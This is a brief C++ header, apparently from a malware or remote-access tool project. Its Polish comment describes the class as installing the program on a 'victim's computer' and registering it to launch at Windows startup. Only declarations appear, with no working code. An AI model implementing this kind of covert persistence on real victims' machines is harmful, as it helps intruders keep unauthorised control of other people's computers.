#include "stdafx.h"
/*!
 * \class Installation
 *
 * \brief 
 * Instalacja na komputerze ofiary
 * automatyczne uruchomienie aplikacji
 * przy starcie systemu Windows
 * 
 * \author DualCore
 * \date grudzieñ 2014
 */
class Installation
{
	bool isdestinationdirectory;
	void RegisterProgram();
public:
	bool IsDestinationDirectoryActive();
	Installation(); // Konstruktor przeprowadza próbê instalacji
};

